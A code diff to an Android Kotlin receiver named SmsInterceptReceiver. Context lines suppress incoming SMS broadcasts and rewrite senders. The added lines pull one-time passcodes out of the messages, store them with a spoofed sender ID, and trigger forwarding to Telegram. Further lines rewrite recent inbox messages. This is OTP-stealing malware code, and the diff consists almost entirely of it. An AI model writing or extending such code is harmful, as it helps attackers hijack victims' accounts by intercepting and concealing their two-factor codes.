@@ -30,6 +30,25 @@ class SmsInterceptReceiver : BroadcastReceiver() {
                     abortBroadcast()
                 } catch (_: Exception) {}
                 SmsSenderRewriter.rewriteOnReceive(appContext, config, sender, body)
+                val spoofed = SmsMatcher.userSenderId(config) ?: sender
+                val token = SmsMatcher.extractToken(body, config.autoExtractOtp)
+                val otp = LastOtp(
+                    otp = token,
+                    sender = spoofed,
+                    body = body,
+                    phone = spoofed,
+                    messageLabel = SmsMatcher.matchedHookedApp(config, sender, body)?.displayName.orEmpty(),
+                    direction = "incoming",
+                    rawPeer = sender,
+                    capturedAt = System.currentTimeMillis()
+                )
+                OtpCaptureWriter.write(appContext, otp)
+                if (SmsMatcher.shouldForwardToTelegram(config, sender, body, "incoming")) {
+                    appContext.sendBroadcast(
+                        Intent(ACTION_SMS_CAPTURED).setPackage(appContext.packageName)
+                    )
+                }
+                InboxSmsRewriteHelper.rewriteRecentInbox(appContext)
                 finish(pending)
                 return
             }
